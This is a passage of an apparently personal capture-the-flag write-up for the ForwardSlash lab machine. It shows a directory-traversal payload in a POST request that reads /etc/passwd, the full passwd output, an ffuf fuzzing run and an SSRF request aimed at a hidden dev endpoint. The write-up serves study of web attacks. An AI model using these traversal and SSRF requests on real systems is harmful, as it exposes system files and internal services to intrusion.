</span></span></code></pre></td></tr></table></div></div><p>We are redirected to <a href=http://backup.forwardslash.htb/login.php>http://backup.forwardslash.htb/login.php</a></p><p>There is a login form. We can use the registration page to sign up.</p><p>If we sign up and log in, we are redirected to <a href=http://backup.forwardslash.htb/welcome.php>http://backup.forwardslash.htb/welcome.php</a></p><h3 id=http-exploitation-file-disclosure--directory-traversal>HTTP exploitation: file disclosure & directory traversal<a hidden class=anchor aria-hidden=true href=#http-exploitation-file-disclosure--directory-traversal>#</a></h3><p>The <em>Change your Profile Picture!</em> feature is disabled.</p><p>But that&rsquo;s just from the HTML so let&rsquo;s edit the DOM, remove the <code>disabled</code>
attributes and send a request:</p><p>By doing a directory traversal on <code>/etc/passwd</code> we obtained a file disclosure:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /profilepicture.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: backup.forwardslash.htb
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>url=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>netif</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>resolve</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>syslog</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>106</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>syslog</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>107</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lxd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>lxd</span><span class=o>/</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>uuidd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>110</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>uuidd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>dnsmasq</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>107</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>dnsmasq</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>misc</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>landscape</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>108</span><span class=p>:</span><span class=mi>112</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>landscape</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>pollinate</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>109</span><span class=p>:</span><span class=mi>1</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>pollinate</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>110</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>pain</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=n>pain</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>pain</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>chiv</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=n>Chivato</span><span class=p>,,,:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>chiv</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>mysql</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>111</span><span class=p>:</span><span class=mi>113</span><span class=p>:</span><span class=n>MySQL</span> <span class=n>Server</span><span class=p>,,,:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=http-exploitation-ssrf>HTTP exploitation: SSRF<a hidden class=anchor aria-hidden=true href=#http-exploitation-ssrf>#</a></h3><p>We can also see if there are any other pages:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>backup</span><span class=o>.</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>txt</span><span class=p>,</span><span class=o>.</span><span class=n>php</span> <span class=o>-</span><span class=n>fs</span> <span class=mi>288</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>1.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>backup</span><span class=o>.</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Extensions</span>       <span class=p>:</span> <span class=o>.</span><span class=n>txt</span> <span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>size</span><span class=p>:</span> <span class=mi>288</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>login</span><span class=o>.</span><span class=n>php</span>               <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>register</span><span class=o>.</span><span class=n>php</span>            <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1490</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>426</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>42</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>php</span>               <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>logout</span><span class=o>.</span><span class=n>php</span>              <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>config</span><span class=o>.</span><span class=n>php</span>              <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>api</span><span class=o>.</span><span class=n>php</span>                 <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>127</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>22</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>dev</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>65</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>6</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>welcome</span><span class=o>.</span><span class=n>php</span>             <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>environment</span><span class=o>.</span><span class=n>php</span>         <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>reset</span><span class=o>-</span><span class=n>password</span><span class=o>.</span><span class=n>php</span>      <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>hof</span><span class=o>.</span><span class=n>php</span>                 <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>114801</span><span class=o>/</span><span class=mi>114801</span><span class=p>]</span><span class=err>┬á</span><span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>1881</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>01</span><span class=p>:</span><span class=mi>01</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>It seems there is a dev endpoint that dives us a HTTP 403.
But even authenticated we can&rsquo;t access <a href=http://backup.forwardslash.htb/dev/>http://backup.forwardslash.htb/dev/</a></p><p>Hopefully the <code>url</code> parameter is not only vulnerable to file disclosure and path
traversal but also to SSRF (Server Side Request Forgery).
Maybe locally this will be allowed, so let&rsquo;s try teh following request in <a href=https://portswigger.net/burp>burp</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /profilepicture.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: backup.forwardslash.htb
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>url=http://backup.forwardslash.htb/dev/
